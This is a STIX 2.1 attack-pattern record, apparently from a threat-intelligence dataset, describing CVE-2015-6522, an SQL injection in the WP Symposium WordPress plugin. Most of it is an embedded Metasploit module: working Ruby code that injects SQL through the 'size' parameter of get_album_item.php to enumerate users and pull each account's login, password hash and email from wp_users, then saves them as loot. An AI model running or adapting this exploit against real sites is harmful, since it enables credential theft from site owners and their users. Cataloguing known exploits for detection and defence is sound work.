{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3bd55fae-bfe0-4365-851f-0092fd91ca17",
    "created": "2024-08-14T16:23:18.46904Z",
    "modified": "2024-08-14T16:23:18.469043Z",
    "name": "WordPress Symposium Plugin SQL Injection",
    "description": " This module exploits a SQL injection vulnerability in the WP Symposium plugin before 15.8 for WordPress, which allows remote attackers to extract credentials via the size parameter to get_album_item.php. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/wp_symposium_sql_injection.rb",
            "external_id": "wp_symposium_sql_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-6522"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress Symposium Plugin SQL Injection',\n        'Description' => %q{\n          This module exploits a SQL injection vulnerability in the WP Symposium plugin\n          before 15.8 for WordPress, which allows remote attackers to extract credentials\n          via the size parameter to get_album_item.php.\n        },\n        'Author' => [\n          'PizzaHatHacker', # Vulnerability discovery\n          'Matteo Cantoni <goony[at]nothink.org>' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2015-6522'],\n          ['EDB', '37824']\n        ],\n        'DisclosureDate' => '2015-08-18'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('URI_PLUGIN', [true, 'The WordPress Symposium Plugin URI', 'wp-symposium'])\n      ]\n    )\n  end\n\n  def check\n    check_plugin_version_from_readme('wp-symposium', '15.8.0', '15.5.1')\n  end\n\n  def uri_plugin\n    normalize_uri(wordpress_url_plugins, datastore['URI_PLUGIN'], 'get_album_item.php')\n  end\n\n  def send_sql_request(sql_query)\n    uri_complete = normalize_uri(uri_plugin)\n\n    begin\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri' => uri_complete,\n        'vars_get' => { 'size' => sql_query }\n      )\n\n      return nil if res.nil? || res.code != 200 || res.body.nil?\n\n      res.body\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE => e\n      vprint_error(\"#{peer} - The host was unreachable!\")\n      return nil\n    end\n  end\n\n  def run\n    vprint_status(\"#{peer} - Attempting to connect...\")\n    vprint_status(\"#{peer} - Trying to retrieve the first user id...\")\n    first_id = send_sql_request('id from wp_users order by id asc limit 1 ; --')\n    if first_id.nil?\n      vprint_error(\"#{peer} - Failed to retrieve the first user id... Try with check function!\")\n      return\n    else\n      vprint_status(\"#{peer} - First user-id is '#{first_id}'\")\n    end\n\n    vprint_status(\"#{peer} - Trying to retrieve the last user id...\")\n    last_id = send_sql_request('id from wp_users order by id desc limit 1 ; --')\n    if last_id.nil?\n      vprint_error(\"#{peer} - Failed to retrieve the last user id\")\n      return\n    else\n      vprint_status(\"#{peer} - Last user-id is '#{last_id}'\")\n    end\n\n    credentials = ''\n\n    vprint_status(\"#{peer} - Trying to retrieve the users informations...\")\n    for user_id in first_id..last_id\n      separator = Rex::Text.rand_text_numeric(7, bad = '0')\n      user_info = send_sql_request(\"concat_ws(#{separator},user_login,user_pass,user_email) from wp_users where id = #{user_id} ; --\")\n\n      if user_info.nil?\n        vprint_error(\"#{peer} - Failed to retrieve the users info\")\n        return\n      else\n        values = user_info.split(separator.to_s)\n\n        user_login = values[0]\n        user_pass = values[1]\n        user_email = values[2]\n\n        print_good(\"#{peer} - #{sprintf('%-15s %-34s %s', user_login, user_pass, user_email)}\")\n        connection_details = {\n          module_fullname: fullname,\n          username: user_login,\n          private_data: user_pass,\n          private_type: :nonreplayable_hash,\n          status: Metasploit::Model::Login::Status::UNTRIED,\n          proof: user_email\n        }.merge(service_details)\n        create_credential(connection_details)\n\n        credentials << \"#{user_login},#{user_pass},#{user_email}\\n\"\n      end\n    end\n\n    unless credentials.empty?\n      loot = store_loot('wp_symposium.http', 'text/plain', rhost, credentials)\n      vprint_good(\"Credentials saved in: #{loot}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-08-18"
}